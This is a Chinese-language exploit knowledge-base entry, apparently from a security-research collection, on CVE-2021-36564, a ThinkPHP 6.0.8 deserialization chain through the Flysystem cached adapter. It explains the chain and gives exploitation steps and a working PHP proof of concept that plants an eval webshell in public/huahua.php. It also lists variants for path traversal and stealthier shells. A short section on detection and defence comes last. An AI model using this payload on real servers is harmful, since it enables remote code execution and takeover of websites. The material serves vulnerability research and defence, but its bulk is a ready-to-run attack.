---
id: web-php-deserialization-flysystem-adapter-cache-webshell
title: ThinkPHP 6.0.8 Flysystem Cached Adapter 链：AbstractCache.__destruct→save→Adapter::write 把 cache 数组当文件内容写 WebShell（CVE-2021-36564）
type: scenario
domain: web
path: web/php/deserialization
technique: flysystem-cached-adapter-destruct-webshell
aliases:
- CVE-2021-36564
- Flysystem Cached Adapter 反序列化
- AbstractCache __destruct
- Adapter save write
- getForStorage json_encode
- thinkphp 6 反序列化写马
tags:
- php
- thinkphp
- deserialization
- flysystem
- pop-chain
- destruct
- webshell
- file-write
cve:
- CVE-2021-36564
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
affected_versions: thinkphp<6.0.9
verification:
  verified_by: verifier-T2-W5
  verified_at: '2026-11-08T14:34:37+08:00'
  notes: 已对照原文核对：AbstractCache.__destruct→Adapter::save→getForStorage(json_encode)→Local::has/applyPathPrefix/write(file_put_contents)、cache 一维数组不裁剪、pathPrefix 默认可写 public/，与原文图08-15一致；未验证点：落盘 JSON 具体形态系按代码推断，原文仅截图显示写马成功
---

## 一句话结论

ThinkPHP 6.0.8 依赖的 `league/flysystem-cached-adapter` 中，`League\Flysystem\Cached\Storage\AbstractCache::__destruct()` 在 `$this->autosave` 为假时调用 `$this->save()`；子类 `Adapter` 的 `save()` 依次执行 `getForStorage()`、`$this->adapter->has($file)`、`$this->adapter->write($file, $contents)`，而 `$adapter`（`League\Flysystem\Adapter\Local`）、`$file`、`$cache` 全是可控属性，因此反序列化一个 `Adapter` 对象就能把 `$cache` 的内容写到 `$file` 指定的路径（默认落在 `public/` 下），得到 WebShell。

## 原理

- **入口是析构**：`unserialize` 结束销毁对象时调用 `__destruct()`；`AbstractCache` 里只有 `if (! $this->autosave) { $this->save(); }`，把 `autosave` 设为 `false` 即无条件进入 `save()`。`AbstractCache` 声明为 `abstract`，必须用具体子类 `Adapter`（`League\Flysystem\Cached\Storage\Adapter`）承载属性。
- **写文件内容由 cache 决定**：`getForStorage()` 返回 `json_encode([$cleaned, $this->complete, $this->expire])`（不同发布版本参数个数略有差异），`$cleaned = cleanContents($this->cache)`；`cleanContents()` 只对 `is_array($object)` 的元素做 `array_intersect_key` 裁剪，所以只要 `$cache` 是一维数组（如 `['huahua' => '<?php eval($_GET[1]);?>']`），裁剪不生效、内容原样进 JSON —— 落到文件里就是 `[{"huahua":"<?php eval($_GET[1]);?>"},[],null]`，其中的 PHP 代码可被解析器执行。
- **`has()` 决定走 write 还是 update**：`save()` 里 `if ($this->adapter->has($this->file))` 为真则 `update`，否则 `write`；`Local::has()` 是 `file_exists(applyPathPrefix($path))`，把 `$file` 设成不存在的文件名（如 `huahua.php`）就保证进入 `write()`。
- **路径可控性**：`Local::applyPathPrefix()` 是 `return $this->getPathPrefix() . ltrim($path, '\\/');`，只去掉路径开头的斜杠；`$pathPrefix`（在 `AbstractAdapter` 中）与 `$file` 都可控。默认 `pathPrefix` 为空时文件写进当前工作目录（ThinkPHP 项目里通常是 `public/`），不需要额外设置即可拿到可直接访问的 WebShell；需要穿目录时把 `pathPrefix` 或 `$file` 写进 `../`。
- **sink 是 `file_put_contents`**：`Local::write($path, $contents, Config $config)` 调用 `$this->ensureDirectory(dirname($location))` 后 `file_put_contents($location, $contents, $this->writeFlags)`，无过滤、无扩展名限制。
- **为什么版本边界是 `<6.0.9`**：这条链依赖 `league/flysystem-cached-adapter` 与 ThinkPHP 的 `think\filesystem` 集成；6.0.9 之后该组件/相关类被调整，`AbstractCache` 的析构行为不再是可用的入口。

## 触发条件

- 目标为 ThinkPHP 6.0.8 及更低版本（组件 `league/flysystem-cached-adapter` 存在，含 `AbstractCache` 与 `Adapter`）。
- 存在可控的 `unserialize` 入口（控制器参数、Cookie、缓存、Session 反序列化等），且未限制 `allowed_classes`。
- Web 进程对目标目录有写权限，且写入目录可被 HTTP 访问（默认 `public/`）。
- `$this->adapter` 可用 `League\Flysystem\Adapter\Local`（同时具备 `has()` 与 `write()`）。

## 利用步骤

1. 确认版本：`composer.lock` 中 `topthink/framework` 与 `league/flysystem-cached-adapter` 版本，目标需 <6.0.9。
2. 生成 payload：构造 `Adapter`，设 `autosave=false`、`adapter=new Local()`、`file='huahua.php'`、`cache=['huahua'=>'<?php eval($_GET[1]);?>']`，`serialize` 后 `urlencode`。
3. 把 payload 投递到 `unserialize` 入口，观察响应是否正常返回（无 fatal）说明链走通。
4. 请求写入的文件（如 `/huahua.php?1=phpinfo();`）验证代码执行。
5. 需要换目录时调整 `pathPrefix`/`file`（如 `pathPrefix='./'`、`file='../public/shell.php'`），或改 `cache` 内容为更隐蔽的 WebShell。

## PoC

```php
<?php
namespace League\Flysystem\Adapter;
class Local {}
namespace League\Flysystem\Cached\Storage;
use League\Flysystem\Adapter\Local;
abstract class AbstractCache {
    protected $autosave;
    protected $cache = [];
}
class Adapter extends AbstractCache {
    protected $adapter;
    protected $file;
    function __construct() {
        $this->autosave = false;
        $this->adapter  = new Local();
        $this->file     = 'huahua.php';
        $this->cache    = ['huahua' => '<?php eval($_GET[1]);?>'];
    }
}
echo urlencode(serialize(new Adapter()));
```

写入结果（`public/huahua.php`）：

```text
[{"huahua":"<?php eval($_GET[1]);?>"},[],null]
```

## 变体与关联

- 变体：只用 `$complete` 字段，不设 `cache`，`getForStorage()` 返回 `[[], <complete>, <expire>]`，`$complete = "*/<?php phpinfo();?>"` 之类同样能落盘（`complete` 与 `expire` 在部分版本参与 json 编码）。
- 变体：`$adapter` 换成其他同时实现 `has()`/`write()` 的 adapter（Sftp/Ftp 等需外部服务，本地利用仍以 `Local` 为主）。
- 关联：[[web-php-deserialization-thinkphp6-flysystem-cachestore-serialize-system-rce]]（同组件的另一条链，sink 是 `system()` 而非写文件）、[[web-php-deserialization-thinkphp6-model-destruct-checkallowfields-output-write-webshell]]（用 Model 侧的 `__destruct` + `__toString` 走到同类写文件 sink）。
- 边界：目标升级到修复版本、`unserialize` 有类白名单、或写入目录不可写/不可访问时链失效。

## 检测与防御

- 升级 ThinkPHP 到 6.0.9+，移除不必要的 `league/flysystem-cached-adapter`。
- 对不可信输入禁用对象反序列化（`unserialize(..., ['allowed_classes' => false])`），或改用 JSON；必须反序列化时用白名单并禁止 `League\Flysystem\*`。
- Web 目录与缓存目录权限分离，`public/` 不允许运行期写入；上传/缓存目录禁止 PHP 解析。
- 检测：反序列化请求中出现 `League\Flysystem\Cached\Storage`、`League\Flysystem\Adapter\Local`；`public/` 下出现内容以 `[{` 开头的 `.php` 文件；随后对该文件的访问日志。
